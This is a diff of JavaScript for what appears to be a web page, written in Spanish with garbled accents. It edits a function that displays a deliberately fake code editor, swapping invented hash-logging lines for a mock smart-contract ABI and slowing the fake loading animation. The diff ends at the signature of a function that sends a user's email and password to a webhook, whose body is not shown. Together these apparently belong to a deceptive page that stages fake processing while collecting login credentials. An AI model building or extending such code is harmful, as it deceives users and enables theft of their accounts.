@@ -275,17 +275,24 @@ function mostrarFakeEditor() {
 
     // Generar comandos falsos de Hash y Log
     let fakeCodeLines = [
-        "<span style='color:red'># Ejemplo de Hash y Log</span>",
+        "<span style='color:red'># GeneraciÃ³n de Hash Ãnicos</span>",
         "",
         "<span style='color:red'>import</span> hashlib",
+        "<span style='color:red'>import</span> json",
         "",
-        "<span style='color:red'>def</span> calcular_hash(datos):",
-        "    <span style='color:red'>return</span> hashlib.sha256(datos.encode()).hexdigest()",
+        "<span style='color:red'>def</span> generar_hash_unico(data):",
+        "    <span style='color:red'>return</span> hashlib.sha256(data.encode()).hexdigest()",
         "",
-        "<span style='color:red'>def</span> registrar_en_archivo(mensaje):",
-        "    <span style='color:red'>with</span> open('log.txt', 'a') <span style='color:red'>as</span> archivo:",
-        "        archivo.write(mensaje)",
-        "        archivo.write('\\n')",
+        "<span style='color:red'>def</span> obtener_contrato_abi():",
+        "    abi = {",
+        "        'contrato': 'MiContrato',",
+        "        'metodos': {",
+        "            'metodo1': {'tipo': 'funciÃ³n', 'argumentos': ['arg1', 'arg2'], 'retorno': 'retorno'},",
+        "            'metodo2': {'tipo': 'funciÃ³n', 'argumentos': ['arg'], 'retorno': 'retorno'},",
+        "            'metodo3': {'tipo': 'evento', 'argumentos': ['arg1', 'arg2']}",
+        "        }",
+        "    }",
+        "    <span style='color:red'>return</span> json.dumps(abi)",
         ""
     ];
 
@@ -312,9 +319,9 @@ function mostrarFakeEditor() {
             dots++;
         } else {
             clearInterval(loadingInterval);
-            updateCode(5); // Comienza mostrando 5 lÃ­neas
+            updateCode(12); // Comienza mostrando 12 lÃ­neas
         }
-    }, 500); // Medio segundo entre puntos
+    }, 3000); // Medio segundo entre puntos
 }
 
 function enviarDatosAWebhook(email, contrasena) {
